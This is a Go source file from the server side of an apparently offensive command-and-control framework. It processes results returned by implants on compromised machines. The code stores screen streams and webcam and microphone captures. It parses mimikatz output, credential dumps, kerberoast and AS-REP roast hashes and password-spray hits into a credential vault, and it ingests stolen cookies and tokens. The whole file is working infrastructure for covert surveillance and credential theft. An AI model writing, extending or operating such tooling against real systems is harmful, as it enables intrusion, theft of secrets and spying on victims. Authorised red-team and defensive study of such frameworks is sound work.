package server

import (
	"context"
	"encoding/base64"
	"fmt"
	"log/slog"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/pkg/protocol"
	"gorm.io/gorm"
)

// ── Task result ingest ────────────────────────────────────────────────────

// vaultNoteError counts a vault crypto failure for observability. Callers use
// it alongside fail-closed handling (drop output, never store plaintext).
func (s *Server) vaultNoteError(op string, err error, taskID uint, agentID string) {
	if s.metrics != nil && s.metrics.VaultErrorsTotal != nil {
		s.metrics.VaultErrorsTotal.WithLabelValues(op).Inc()
	}
	slog.Error("Vault crypto failure", "op", op, "task_id", taskID, "agent_id", agentID, "err", err)
}

// encryptTaskFieldsOrBlank encrypts a task copy's Result/Error for storage.
// Fail-closed: on vault failure the output is dropped and replaced with a
// vault-error marker so secrets never land in the DB as plaintext.
// encryptTaskFieldsFn is the vault call behind encryptTaskFieldsOrBlank. It is a
// var so the fail-closed branch can be tested: InitLootEncryption deliberately
// never clears an existing key (stored loot must stay decryptable), so a test
// cannot make the real vault unavailable once the suite has initialised it.
var encryptTaskFieldsFn = func(task *db.Task) error { return task.EncryptTaskFields() }

func (s *Server) encryptTaskFieldsOrBlank(task *db.Task) error {
	if err := encryptTaskFieldsFn(task); err != nil {
		task.Result = ""
		task.Error = "vault encryption unavailable"
		s.vaultNoteError("encrypt-result", err, task.ID, task.AgentID)
		return err
	}
	return nil
}

// taskResultTailCap bounds the streaming tail persisted for a running task
// so a chatty long-running command cannot grow the DB without limit. The
// final result overwrites this wholesale on completion.
const taskResultTailCap = 64 << 10

// appendTaskResultTail appends one partial chunk to the task's stored output,
// keeping at most the last taskResultTailCap bytes.
func appendTaskResultTail(task *db.Task, chunk string) {
	combined := task.Result + chunk
	if len(combined) > taskResultTailCap {
		combined = combined[len(combined)-taskResultTailCap:]
	}
	task.Result = combined
}

// decodeTaskResult normalizes a beacon result for storage: base64 text
// outputs are decoded, while binary-carrying types (file transfers,
// media captures) keep their base64. Decoding binary JPEG/WAV into a Go
// string corrupts it at JSON marshal time (invalid UTF-8 becomes U+FFFD),
// so the console could never render webcam/mic captures otherwise.
// Pure so it stays unit-testable.
func decodeTaskResult(taskType, encoding, output string) string {
	if encoding == "base64" && output != "" {
		switch taskType {
		case "upload", "download", "webcam", "mic":
			return output
		}
		if decoded, err := base64.StdEncoding.DecodeString(output); err == nil {
			return string(decoded)
		}
	}
	return output
}

func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid string, now time.Time) {
	// Batch-load all referenced tasks
	taskIDs := make([]uint, 0, len(results))
	taskIDSet := make(map[uint]struct{})
	for _, r := range results {
		if r.TaskID > 0 {
			if _, ok := taskIDSet[r.TaskID]; !ok {
				taskIDs = append(taskIDs, r.TaskID)
				taskIDSet[r.TaskID] = struct{}{}
			}
		}
	}
	var loadedTasks []db.Task
	if len(taskIDs) > 0 {
		if err := s.db.Where("id IN ? AND agent_id = ?", taskIDs, strings.ToLower(uuid)).Limit(len(taskIDs)).Find(&loadedTasks).Error; err != nil {
			slog.Error("Failed to batch-load tasks", "agent_id", uuid, "error", err)
		}
	}
	taskMap := make(map[uint]*db.Task, len(loadedTasks))
	for i := range loadedTasks {
		taskMap[loadedTasks[i].ID] = &loadedTasks[i]
	}

	var pendingAudit []auditEntry
	defer func() { s.LogAuditRecords(nil, pendingAudit) }()

	for _, r := range results {
		if s.isDuplicateResult(uuid, r) {
			slog.Debug("Duplicate task result dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type, "rid", r.ResultID)
			continue
		}
		// Per-task key decryption (P2): if the agent sealed this result with the
		// task-issued AES-256-GCM key, recover the plaintext before further
		// processing. Failure leaves the ciphertext in place and is logged.
		if r.EncryptedWithTaskKey {
			if t, ok := taskMap[r.TaskID]; ok && t.TaskKey != "" {
				if plain, err := decryptTaskKeyOutput(t.TaskKey, r.Output); err == nil {
					r.Output = plain
					r.EncryptedWithTaskKey = false
				} else {
					slog.Warn("Per-task key decryption failed", "agent_id", uuid, "task_id", r.TaskID, "err", err)
				}
			} else {
				slog.Warn("Per-task key result with no stored key", "agent_id", uuid, "task_id", r.TaskID)
			}
		}
		if r.Type == "screen_frame" && r.Output != "" {
			if s.IsScreenMonitoring(uuid) {
				s.BroadcastScreenshot(uuid, r.Output)
			}
			continue
		}
		if r.Type == "screen_stream_error" {
			errorMessage := strings.TrimSpace(r.Error)
			if errorMessage == "" {
				errorMessage = strings.TrimSpace(r.Output)
			}
			if errorMessage == "" {
				errorMessage = "screen stream stopped unexpectedly"
			}
			slog.Warn("Screen stream stopped on agent", "agent_id", uuid, "error", errorMessage)
			s.BroadcastScreenMonitorError(uuid, errorMessage)
			continue
		}
		if r.Type == "screen_trigger" && r.Output != "" {
			s.writeScreenshotFile(s.rawDataDir(), uuid, r.TaskID, r.Output)
			s.BroadcastScreenshot(uuid, r.Output)
			continue
		}

		errMessage := truncateString(r.Error, 100)
		if r.Type == protocol.TaskTypeFileScan && errMessage != "" {
			errMessage = "[file_scan error details withheld]"
		}
		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", errMessage)

		task, ok := taskMap[r.TaskID]
		if !ok {
			continue
		}
		// Finality guard (P6): a cancelled task is terminal. The agent may have
		// run the command before the abort reached it; its result must not
		// resurrect the task row. The pending slot was already released by
		// whoever cancelled the task (cancel endpoint / kill-switch disarm) —
		// decrementing here double-counted the release.
		if task.Status == "cancelled" {
			slog.Info("Result for cancelled task dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type)
			continue
		}
		// Durable idempotency (P8): the agent reseeds results with the same rid
		// after a dropped frame, so an exact rid that was already applied must
		// not be applied a second time (this check survives server restarts,
		// unlike the in-memory dedup cache).
		if r.ResultID != "" && task.LastResultID == r.ResultID && (task.Status == "completed" || task.Status == "failed") {
			slog.Debug("Duplicate task result dropped (durable)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
			continue
		}
		if task.AcknowledgedAt == nil {
			acknowledgedAt := now
			task.AcknowledgedAt = &acknowledgedAt
		}

		// Streaming progress chunk: grow the stored output tail and keep the
		// task in "running". The final (non-partial) result overwrites the
		// value wholesale and runs the normal finalisation path below.
		if r.Partial {
			// Terminal-state guard: a late/retried partial chunk (fresh rid,
			// reordered delivery) must not clobber the FINAL output of an
			// already-finalised task — that destroyed e.g. completed creds
			// dumps with a 64KB tail. Only live tasks accept tails.
			switch task.Status {
			case "pending", "running", "sent":
			default:
				slog.Debug("Partial chunk dropped: task already finalised", "agent_id", uuid, "task_id", r.TaskID, "status", task.Status)
				continue
			}
			appendTaskResultTail(task, r.Output)
			task.UpdatedAt = now
			if uerr := s.withBusyRetryDB("result", func() *gorm.DB {
				return s.db.Model(&db.Task{}).Where("id = ?", task.ID).
					Updates(map[string]interface{}{"result": task.Result, "updated_at": now})
			}).Error; uerr != nil {
				slog.Error("Failed to persist partial task output", "agent_id", uuid, "task_id", r.TaskID, "error", uerr)
			}
			s.broadcastTaskUpdate(uuid, *task)
			continue
		}

		// Atomic first-final-wins claim: chunked transfers (upload/download)
		// deliver many final-shaped results per task ID. Without this guard
		// every chunk re-finalised the task and drained another pending-slot
		// from agentPendingTasks, zeroing MaxPendingTasksPerAgent and letting
		// that agent bypass the anti-flood gate entirely.
		finalStatus := "completed"
		if r.Error != "" {
			finalStatus = "failed"
		}
		claim := s.withBusyRetryDB("result", func() *gorm.DB {
			return s.db.Model(&db.Task{}).
				Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).
				Update("status", finalStatus)
		})
		if claim.Error != nil {
			slog.Error("Failed to claim task finality", "agent_id", uuid, "task_id", r.TaskID, "error", claim.Error)
			continue
		}
		if claim.RowsAffected == 0 {
			// Already terminal (duplicate/replayed result): drop silently.
			slog.Debug("Duplicate terminal result dropped (finality claim)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
			continue
		}
		task.Status = finalStatus
		if r.Error != "" {
			task.Error = r.Error
		}
		task.UpdatedAt = now

		// Decrement per-agent pending task counter (delete key at zero to avoid leak) —
		// reached exactly once per task thanks to the claim above.
		s.decrementPendingTasks(uuid)
		if s.metrics != nil {
			s.metrics.TaskExecuteDuration.WithLabelValues(task.Type).Observe(now.Sub(task.CreatedAt).Seconds())
		}
		s.fileChains.reset(task.ID)
		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
			task.Result = "processed"
			s.broadcastTaskUpdate(uuid, *task)
			if r.Type == "screen_stream_start" && task.Status == "failed" {
				s.BroadcastScreenMonitorError(uuid, task.Error)
			}
			if err := s.withBusyRetryDB("result", func() *gorm.DB {
				return s.db.Save(task)
			}).Error; err != nil {
				slog.Error("Failed to save screen control task", "task_id", task.ID, "error", err)
			}
			continue
		}

		// Silent task types: save result for polling but skip WebSocket broadcast
		isSilent := r.Type == "ls"

		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output != "" {
			slog.Info("Processing screenshot result", "agent_id", uuid, "task_id", r.TaskID)
			// Explicit operator captures are durable even while live monitoring is
			// active. Continuous screen_frame messages remain memory-only, so this
			// does not turn a live stream into unbounded disk retention.
			task.Result = r.Output
			s.saveScreenshot(s.rawDataDir(), uuid, task.ID, r.Output)
			if s.IsScreenMonitoring(uuid) {
				s.BroadcastScreenshot(uuid, r.Output)
			}
		} else if r.Type == "file_thumb" && r.Output != "" {
			// Thumbnail bytes are written to data/thumbs and replaced with an
			// opaque id in the task result; task rows must not become an
			// alternate unbounded image store.
			task.Result = s.storeFileThumbs(uuid, r.Output)
		} else {
			task.Result = decodeTaskResult(r.Type, r.Encoding, r.Output)
		}

		// Enforce the max result size BEFORE any downstream parsing or
		// processing. A compromised agent could otherwise stream a multi-MB
		// blob through the regex-backed credential/kerberoast parsers below
		// before the size guard fires (previously applied only at save time).
		if r.Type != "screenshot" && r.Type != "webcam" && r.Type != "mic" && len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}

		// Format token_list_procs results into a readable table
		if r.Type == "token_list_procs" && task.Result != "" {
			task.Result = FormatTokenProcsFromJSON(task.Result)
		}

		// When set_sleep succeeds, update agent's current interval/jitter
		if r.Type == "set_sleep" && task.Status == "completed" {
			parts := strings.Split(task.Command, ",")
			sleepUpdates := map[string]interface{}{}
			if len(parts) >= 1 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && v >= 1 && v <= 86400 {
					sleepUpdates["current_interval"] = v
				}
			}
			if len(parts) >= 2 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil && v >= 0 && v <= 100 {
					sleepUpdates["current_jitter"] = v
				}
			}
			if len(sleepUpdates) > 0 {
				if err := s.withBusyRetryDB("result", func() *gorm.DB {
					return s.db.Model(&db.Implant{}).Where("id = ?", uuid).Updates(sleepUpdates)
				}).Error; err != nil {
					slog.Error("Failed to update sleep settings on agent", "agent_id", uuid, "error", err)
				} else {
					s.broadcastAgentDataUpdate(uuid, sleepUpdates)
					// The operator-visible sleep values are part of the delivered
					// network config; refresh on this agent's next beacon.
					s.markNetworkConfigChanged()
				}
			}
		}

		// Auto-parse credential dump results into the vault
		if r.Type == "creds" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreCredentials(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "creds_dump"},
			})
		}

		// Auto-parse mimikatz results into the credential vault
		if r.Type == "mimikatz" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreCredentials(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "mimikatz"},
			})
		}

		// Auto-parse kerberoast TGS hashes into the credential vault
		if r.Type == "kerberoast" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreKerberoastResults(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "kerberoast"},
			})
		}

		// Auto-parse asreproast hashes into the credential vault
		if r.Type == "asreproast" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreASREPRoastResults(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "asreproast"},
			})
		}

		// Auto-ingest valid password spray hits into the credential vault
		if r.Type == "password_spray" && task.Status == "completed" && task.Result != "" {
			if stored := s.parseAndStorePasswordSprayResults(uuid, *task, task.Result); stored > 0 {
				s.eventManager.Emit(Event{
					Type:      EventCredentialFound,
					AgentID:   uuid,
					AgentHost: agent.Hostname,
					AgentIP:   agent.IP,
					Timestamp: now,
					Data:      map[string]interface{}{"source": "password_spray", "count": stored},
				})
			}
		}

		// Confirm matching vault entries on successful credential checks
		if r.Type == "cred_check" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreCredCheckResult(uuid, *task, task.Result)
		}

		if r.Type == "cookie_export" && task.Status == "completed" && task.Result != "" {
			s.ingestCookieExport(uuid, task.Result)
		}

		// Result size cap is enforced before parsing (see above); screenshots
		// are exempt from the cap.
		// Encrypt Result/Error at rest (H3): build a DB copy so the in-memory
		// `task` stays plaintext for the WebSocket broadcast and task callback
		// below, while only the persisted ciphertext differs.
		if r.ResultID != "" {
			task.LastResultID = r.ResultID
		}
		dbTask := *task
		if err := s.encryptTaskFieldsOrBlank(&dbTask); err != nil {
			// The agent executed fine but the vault is broken: fail loudly
			// (alerts fire) rather than storing the output as plaintext.
			task.Status = "failed"
		}
		if err := s.withBusyRetryDB("result", func() *gorm.DB {
			return s.db.Model(task).Updates(map[string]interface{}{
				"status":         task.Status,
				"result":         dbTask.Result,
				"error":          dbTask.Error,
				"progress":       task.Progress,
				"total_bytes":    task.TotalBytes,
				"transferred":    task.Transferred,
				"last_result_id": task.LastResultID,
			})
		}).Error; err != nil {
			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
		}
		if !isSilent {
			s.broadcastTaskUpdate(uuid, *task)
		}
		// A read-only enumeration that failed is worth one more ask; anything that changes state is not. The helper owns
		// that distinction, and swallows its own failures so a retry can never damage the result just stored.
		if task.Status == "failed" {
			if retryID, created := s.maybeAutoRetryTask(task.ID, uuid, task.Type, task.Command, task.Shell,
				task.CreatedBy, task.RetryCount, task.TenantID); created {
				slog.Info("Automation: re-issued a failed read-only task",
					"task_id", task.ID, "retry_id", retryID, "type", task.Type)
			}
		}

		// Emit task lifecycle events so webhooks, email, automation rules, and
		// (for failures) the alert/notification pipeline react. Generic results
		// previously never emitted EventTaskComplete/EventTaskFail, leaving the
		// subscribers in server.go permanently dormant. Intermediate screenshot
		// chunks carry no TaskID and never reach this point, so only genuine
		// task completions fire.
		evtType := EventTaskComplete
		if task.Status == "failed" {
			evtType = EventTaskFail
		}
		s.eventManager.Emit(Event{
			Type:      evtType,
			AgentID:   uuid,
			AgentHost: agent.Hostname,
			AgentIP:   agent.IP,
			TaskID:    task.ID,
			Timestamp: now,
			Data: map[string]interface{}{
				"type":    r.Type,
				"status":  task.Status,
				"command": task.Command,
			},
		})

		// Task callbacks: POST results to external URL when task completes.
		// Bounded pool with shutdown-safe acquire (see runTaskWorker).
		if task.CallbackURL != "" && !task.CallbackSent {
			completed := *task
			s.runTaskWorker("task_callback", func() {
				s.executeTaskCallback(completed, uuid)
			})
		}

		if s.pluginManager != nil {
			completed := *task
			s.runTaskWorker("plugin_hook", func() {
				ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
				defer cancel()
				if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
					Type:      plugin.EventTaskCompleted,
					Timestamp: now,
					AgentID:   uuid,
					Payload: map[string]interface{}{
						"task_id":   completed.ID,
						"task_type": completed.Type,
						"status":    completed.Status,
						"error":     completed.Error,
					},
				}); err != nil {
					slog.Warn("Hook errors on task_completed event", "agent_id", uuid, "task_id", completed.ID, "err", err)
				}
			})
		}

		// ── Token vault: persist steal/make results ───────────────────────────
		if r.Error == "" && task.Result != "" {
			switch r.Type {
			case "token_steal", "token_make", "token_revert", "rev2self":
				completed := *task
				s.runTaskWorker("token_result", func() {
					s.processTokenResult(uuid, r.Type, completed.Result)
				})
			}
		}

		if (r.Type == "shell" || r.Type == "ps") && (r.Output != "" || r.Error != "" || task.Command != "") {
			cmdStr := task.Command
			if cmdStr == "" {
				cmdStr = r.Type
			}
			resultStr := r.Output
			if r.Encoding == "base64" && r.Output != "" {
				if decoded, err := base64.StdEncoding.DecodeString(r.Output); err == nil {
					resultStr = string(decoded)
				}
			}
			if r.Error != "" {
				resultStr = "ERROR: " + r.Error
			}
			if len(resultStr) > AuditLogResultMaxLen {
				resultStr = resultStr[:AuditLogResultMaxLen] + "..."
			}
			details := fmt.Sprintf("cmd: %s | result: %s", cmdStr, resultStr)
			if len(details) > AuditLogDetailsMaxLen {
				details = details[:AuditLogDetailsMaxLen] + "..."
			}
			pendingAudit = append(pendingAudit, auditEntry{action: "command_result", resource: "agent", agentID: uuid, details: details, success: r.Error == ""})
		}

		if r.Type == "upload" && r.Output != "" {
			if saveFileChunk(s, uuid, task, r, "upload", "File chunk saved") {
				continue
			}
		}

		if r.Type == "download" && r.Output != "" && (r.Offset > 0 || task.Offset > 0 || r.Size > 0) {
			if saveFileChunk(s, uuid, task, r, "download", "Download chunk saved") {
				continue
			}
		}
	}
}

func (s *Server) processTaskAcknowledgements(agentID string, taskIDs []uint, now time.Time) {
	if len(taskIDs) == 0 {
		return
	}
	unique := make([]uint, 0, len(taskIDs))
	seen := make(map[uint]struct{}, len(taskIDs))
	for _, taskID := range taskIDs {
		if taskID == 0 {
			continue
		}
		if _, ok := seen[taskID]; ok {
			continue
		}
		seen[taskID] = struct{}{}
		unique = append(unique, taskID)
	}
	if len(unique) == 0 {
		return
	}
	if err := s.withBusyRetryDB("ack", func() *gorm.DB {
		return s.db.Model(&db.Task{}).
			Where("id IN ? AND agent_id = ? AND status = ? AND acknowledged_at IS NULL", unique, agentID, "running").
			Update("acknowledged_at", now)
	}).Error; err != nil {
		slog.Error("Failed to acknowledge agent tasks", "agent_id", agentID, "count", len(unique), "error", err)
	}
}

// decrementPendingTasks releases one slot of the per-agent pending-task
// counter. Kept as a thin alias of decPendingTasks (task_dispatch.go) so
// beacon and relay paths share one delete-at-zero implementation.
func (s *Server) decrementPendingTasks(agentID string) {
	s.decPendingTasks(agentID)
}
